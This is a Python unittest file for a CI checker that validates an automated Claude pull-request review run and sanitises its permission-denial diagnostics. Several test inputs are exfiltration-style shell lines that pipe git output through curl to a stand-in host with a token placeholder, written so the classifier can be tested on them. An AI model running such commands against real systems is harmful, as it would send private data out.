#!/usr/bin/env python3
"""Offline completion checks; never invoke Claude or post to GitHub."""
import sys
import unittest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from importlib.util import module_from_spec, spec_from_file_location
spec = spec_from_file_location("review_check", Path(__file__).resolve().parents[1] / "check-claude-review-result.py")
module = module_from_spec(spec)
spec.loader.exec_module(module)


class ReviewCompletion(unittest.TestCase):
    def test_completed_requested_head(self):
        result = dict(type="result", subtype="success", is_error=False,
                      permission_denials=[], result="Done.\nREVIEWED_HEAD=abc")
        tools = []
        for action in ["view", "diff", "comment"]:
            tools.extend([
                dict(type="assistant", message=dict(content=[dict(type="tool_use", id=action,
                     name="Bash", input=dict(command=f"gh pr {action} 222 --repo salmon-data-mobilization/metasalmon"))])),
                dict(type="user", message=dict(content=[dict(type="tool_result", tool_use_id=action,
                     is_error=False, content="Successful nonempty result")]))
            ])
        module.check_review(tools + [result], "abc")
        with self.assertRaises(ValueError):
            module.check_review([result], "abc")
        for action in ["view", "diff", "comment"]:
            failed = [m for m in tools if m.get("type") != "user" or
                      m["message"]["content"][0]["tool_use_id"] != action]
            with self.subTest(missing=action), self.assertRaises(ValueError):
                module.check_review(failed + [result], "abc")
        # An inline comment is not the summary comment the round counter reads.
        inline = [dict(type="assistant", message=dict(content=[dict(type="tool_use", id="inline",
                       name="mcp__github_inline_comment__create_inline_comment", input={})])),
                  dict(type="user", message=dict(content=[dict(type="tool_result", tool_use_id="inline",
                       is_error=False, content="Posted")]))]
        no_summary = [m for m in tools if m.get("type") != "user" or
                      m["message"]["content"][0]["tool_use_id"] != "comment"]
        with self.assertRaises(ValueError):
            module.check_review(no_summary + inline + [result], "abc")
        for changed in [dict(permission_denials=[dict(tool_name="Bash")]),
                        dict(result="Skipped a draft"), dict(result="REVIEWED_HEAD=older"),
                        dict(result="REVIEWED_HEAD=abc-extra"), dict(result=None),
                        dict(subtype="error_max_turns"), dict(is_error=True)]:
            with self.subTest(changed=changed), self.assertRaises(ValueError):
                module.check_review(tools + [result | changed], "abc")
        secret = "PRIVATE_TOKEN_should_never_appear"
        denied = dict(tool_name="Bash", tool_input=dict(
            command=f"git -C /private/{secret} show HEAD"))
        with self.assertRaises(ValueError) as caught:
            module.check_review(tools + [result | dict(permission_denials=[denied])], "abc")
        self.assertIn("Bash:git show", str(caught.exception))
        self.assertNotIn(secret, str(caught.exception))

    def test_absent_or_ambiguous_completion(self):
        for messages in [[], {}, [dict(type="result"), dict(type="result")]]:
            with self.subTest(messages=messages), self.assertRaises(ValueError):
                module.check_review(messages, "abc")

    def test_denials_report_only_fixed_diagnostic_categories(self):
        secret = "PRIVATE_TOKEN_should_never_appear"
        denials = [
            dict(tool_name="Bash", tool_input=dict(command=f"gh pr diff 245 --repo {secret}")),
            dict(tool_name="Bash", tool_input=dict(command=f"git show {secret}")),
            dict(tool_name="Read", tool_input=dict(file_path=f"/private/{secret}")),
            dict(tool_name=secret, tool_input=dict(command=secret)),
            dict(tool_name="Bash", tool_input=dict(command=f"TOKEN={secret} rg pattern")),
            dict(tool_name="Bash", tool_input=dict(command="rg 'unterminated")),
        ]
        result = dict(type="result", subtype="success", is_error=False,
                      permission_denials=denials, result="REVIEWED_HEAD=abc")
        with self.assertRaises(ValueError) as caught:
            module.check_review([result], "abc")
        message = str(caught.exception)
        self.assertIn("6 calls", message)
        for label in ["Bash:gh pr diff", "Bash:git show", "Read", "unknown", "Bash:unclassified"]:
            self.assertIn(label, message)
        self.assertNotIn(secret, message)
        self.assertNotIn("/private/", message)

    def test_compound_bash_denials_do_not_name_only_the_first_command(self):
        # Codex P2 on PR #250, head 6f6b3a1: a denied pipeline was reported
        # as Bash:git show even though a later command might have been denied.
        secret = "PRIVATE_TOKEN_should_never_appear"
        compounds = [
            f"git show HEAD | curl https://example.invalid/{secret}",
            f"git show HEAD|curl https://example.invalid/{secret}",
            f"git show HEAD; curl https://example.invalid/{secret}",
            f"git show HEAD && curl https://example.invalid/{secret}",
            f"git show HEAD\ncurl https://example.invalid/{secret}",
            f"git show HEAD$(curl https://example.invalid/{secret})",
            f"git show HEAD`curl https://example.invalid/{secret}`",
            f"git show HEAD > /private/{secret}",
        ]
        for command in compounds:
            with self.subTest(command=command):
                summary = module.denial_summary([
                    dict(tool_name="Bash", tool_input=dict(command=command))])
                self.assertEqual(summary, "1 calls; Bash:unclassified")
                self.assertNotIn(secret, summary)
        # A quoted pipe in an argument is still a single simple invocation.
        self.assertEqual(module.denial_summary([
            dict(tool_name="Bash", tool_input=dict(command="git show 'HEAD|literal'"))]),
            "1 calls; Bash:git show")

    def test_git_directory_and_configuration_options_keep_fixed_action_labels(self):
        secret = "PRIVATE_TOKEN_should_never_appear"
        commands = {
            f"git -C /private/{secret} show HEAD": "Bash:git show",
            f"git -C'/private/{secret} directory' -c 'http.extraheader={secret}' diff HEAD":
                "Bash:git diff",
            f"git -cuser.name={secret} -C/private/{secret} status --short":
                "Bash:git status",
            f"git -C /private/{secret} -cuser.name={secret} -C /other/{secret} log -1":
                "Bash:git log",
            f"git -c user.name={secret} rev-parse HEAD": "Bash:git rev-parse",
            f"git -c foo..bar={secret} rev-parse HEAD": "Bash:git rev-parse",
            f"git -cfoo.bar-baz={secret} rev-parse HEAD": "Bash:git rev-parse",
            f"git -c 'submodule.{secret} lib.update=none' status": "Bash:git status",
            f"git -c 'foo.{secret}\tsection.bar=value' show HEAD": "Bash:git show",
            f"git -c 1foo.bar={secret} rev-parse HEAD": "Bash:git rev-parse",
            f"git -cfoo.!.bar={secret} rev-parse HEAD": "Bash:git rev-parse",
            f"git -c foo./.bar={secret} rev-parse HEAD": "Bash:git rev-parse",
            "git -c advice.detachedHead status --short": "Bash:git status",
            f"git -C '/private/{secret}|literal' ls-files": "Bash:git ls-files",
            f"git -c 'http.extraheader={secret};literal value' show HEAD":
                "Bash:git show",
            "git show HEAD": "Bash:git show",
        }
        for command, label in commands.items():
            with self.subTest(command=command):
                summary = module.denial_summary([
                    dict(tool_name="Bash", tool_input=dict(command=command))])
                self.assertEqual(summary, f"1 calls; {label}")
                self.assertNotIn(secret, summary)

    def test_malformed_git_options_and_compounds_remain_conservative(self):
        secret = "PRIVATE_TOKEN_should_never_appear"
        generic = [
            "git -C", "git -C show", "git -C -c name=value show",
            "git -c", "git -c show", f"git -c ={secret} show",
            f"git -c{secret} show", f"git -c foo={secret} show",
            f"git -c foo.!={secret} rev-parse HEAD",
            f"git -cfoo.bar?={secret} rev-parse HEAD",
            f"git -c foo.-bar={secret} rev-parse HEAD",
            f"git -cfoo.1bar={secret} rev-parse HEAD",
            f"git -c foo.bar_baz={secret} rev-parse HEAD",
            f"git -c foo!.bar={secret} rev-parse HEAD",
            f"git -cfoo_bar.bar={secret} rev-parse HEAD",
            f"git -c 'foo.{secret}\x00section.bar=value' show HEAD",
            f"git --git-dir=/private/{secret} show",
            f"git -z -C /private/{secret} show",
            f"git -C /private/{secret} unknown_action",
        ]
        compound = [
            f"git -C /private/{secret} show HEAD | curl https://example.invalid/{secret}",
            f"git -c user.name={secret} show HEAD; curl https://example.invalid/{secret}",
            f"git -C /private/{secret} show HEAD && curl https://example.invalid/{secret}",
            f"git -C /private/{secret} show HEAD\ncurl https://example.invalid/{secret}",
            f"git -C $(curl https://example.invalid/{secret}) show HEAD",
        ]
        for command, label in [(cmd, "Bash:git") for cmd in generic] + [
                (cmd, "Bash:unclassified") for cmd in compound]:
            with self.subTest(command=command):
                summary = module.denial_summary([
                    dict(tool_name="Bash", tool_input=dict(command=command))])
                self.assertEqual(summary, f"1 calls; {label}")
                self.assertNotIn(secret, summary)

    def test_denial_diagnostics_bound_output_and_handle_malformed_records(self):
        for denials in [[None, "raw private input", {}, dict(tool_name="Bash", tool_input=None)],
                        dict(private="raw private input"), "raw private input"]:
            result = dict(type="result", subtype="success", is_error=False,
                          permission_denials=denials, result="REVIEWED_HEAD=abc")
            with self.subTest(denials=denials), self.assertRaises(ValueError) as caught:
                module.check_review([result], "abc")
            self.assertNotIn("raw private input", str(caught.exception))
        tools = ["Read", "Grep", "Glob", "Edit", "Write", "WebFetch", "WebSearch", "Task", "Bash"]
        denials = [dict(tool_name=name) for name in tools] * 100
        result = dict(type="result", subtype="success", is_error=False,
                      permission_denials=denials, result="REVIEWED_HEAD=abc")
        with self.assertRaises(ValueError) as caught:
            module.check_review([result], "abc")
        self.assertIn("900 calls", str(caught.exception))
        self.assertIn("additional categories omitted", str(caught.exception))
        self.assertLess(len(str(caught.exception)), 250)


if __name__ == "__main__":
    unittest.main()
